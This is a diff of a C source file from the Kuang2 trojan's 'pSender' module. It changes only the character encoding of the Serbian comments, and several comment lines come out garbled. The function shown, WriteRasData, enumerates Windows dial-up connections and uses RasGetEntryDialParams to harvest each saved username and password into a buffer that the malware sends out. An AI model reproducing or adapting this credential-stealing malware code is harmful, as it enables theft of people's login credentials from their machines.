@@ -1,6 +1,6 @@
 /***[ThuNderSoft]*************************************************************
 						  KUANG2 pSender: WriteRasData
-								úùÄÍ WEIRD ÍÄùú
+								     WEIRD
 *****************************************************************************/
 
 #include <windows.h>
@@ -10,24 +10,24 @@
 #include <tools.h>
 #include <win95e.h>
 
-extern char buff[];		// ovde se dodaje ono „to se „alje
+extern char buff[];		// ovde se dodaje ono Å¡to se Å¡alje
 extern char temp[];
 
 /*
 	WriteRasData
 	------------
-  ş ita RasPodatke i njih snima u bafer. Ovi podaci su 100% sigurni, ako ih
-	uop„te ima.	 Nema ih kada je iskljueno 'Save Password'. */
+  + Äita RasPodatke i njih snima u bafer. Ovi podaci su 100% sigurni, ako ih
+	uopÅ¡te ima.	 Nema ih kada je iskljuÄeno 'Save Password'. */
 
 BOOL WriteRasData(char *fb)
 {
 	RASENTRYNAME *rasko;				// ovde smesti ras entry-je (phone-books)
-	RASDIALPARAMS rasdata;				// info o pojedinanom DialUpu
+	RASDIALPARAMS rasdata;				// info o pojedinaÄnom DialUpu
 	BOOL ispassget;						// da li je uzet password?
-	DWORD entrysize;					// veliina ras entryja
+	DWORD entrysize;					// veliÄina ras entryja
 	DWORD brojDUP;						// broj upisanih DUPova
-	int rezultat;						// interna, sme„ta se rezultat f-ja
-	int i;								// interni broja
+	int rezultat;						// interna, smeÅ¡ta se rezultat f-ja
+	int i;								// interni brojaÄ
 	int maxdups;						// ukupan broj dupova
 	BOOL retval;
 	char wME[]="\r\nwME";
@@ -37,14 +37,14 @@ BOOL WriteRasData(char *fb)
 	retval=FALSE;
 	maxdups=entrysize=0;
 	rezultat=RasEnumEntries(NULL, NULL, NULL, &entrysize, &brojDUP);
-	maxdups=brojDUP;	// Sada maxdups daje taan broj zapisa!
+	maxdups=brojDUP;	// Sada maxdups daje taÄan broj zapisa!
 
-	entrysize=sizeof(RASENTRYNAME)*maxdups;			// ukupna veliina
+	entrysize=sizeof(RASENTRYNAME)*maxdups;			// ukupna veliÄina
 
 	rasko=GlobalAlloc(GMEM_FIXED, entrysize);
 	if (rasko==NULL) {
 		straddF(buff, wME);
-		return FALSE;			// iza”i
+		return FALSE;			// izaÄ‘i
 	}
 	rasko[0].dwSize=sizeof(RASENTRYNAME);	// Prvi entry mora da ima setovan
 											// dwSize da bi radilo
@@ -54,12 +54,12 @@ BOOL WriteRasData(char *fb)
 	if (rezultat == ERROR_BUFFER_TOO_SMALL) {
 		straddF(buff, wME);
 		GlobalFree(rasko);
-		return FALSE;			// iza”i po„to ne†e ni„ta pisati
+		return FALSE;			// izaÄ‘i poÅ¡to neÄ‡e niÅ¡ta pisati
 	} else {
 		if (rezultat) {
 			straddF(buff, eRE);
 			GlobalFree(rasko);
-			return FALSE;		// systemska gre„ka
+			return FALSE;		// systemska greÅ¡ka
 		}
 	}
 
@@ -68,17 +68,17 @@ BOOL WriteRasData(char *fb)
 		strcopyF(rasdata.szEntryName, rasko[i].szEntryName);
 		// obavezno za ispravan rad f-je
 		rasdata.dwSize=sizeof(RASDIALPARAMS);
-		// uini ono „to mora„
+		// uÄini ono Å¡to moraÅ¡
 		rezultat = RasGetEntryDialParams(NULL, &rasdata, &ispassget);
 		if (rezultat)
 			straddF(buff, eRG);
 		else {
-			// Nema gre„ke, zapi„i sve „to me zanima: Entry/User/Pass
+			// Nema greÅ¡ke, zapiÅ¡i sve Å¡to me zanima: Entry/User/Pass
 			strcopyFaddd(temp, rasdata.szUserName, 0x0A0D);
 			straddFaddd(temp, rasdata.szPassword, 0x0A0D);
 
 			if (!strfind(fb, temp)) {
-				retval=TRUE;				// nije na„ao je podatke
+				retval=TRUE;				// nije naÅ¡ao je podatke
 				straddF(fb, temp);			// dodaj ih u fajl bafer
 
 				if (i==0) straddF(buff, "-----\r\n");              // odvoji
@@ -88,6 +88,6 @@ BOOL WriteRasData(char *fb)
 		}
 	}
 
-	GlobalFree(rasko);	// oslobodi raska da ide ku†i
+	GlobalFree(rasko);	// oslobodi raska da ide kuÄ‡i
 	return retval;
 }
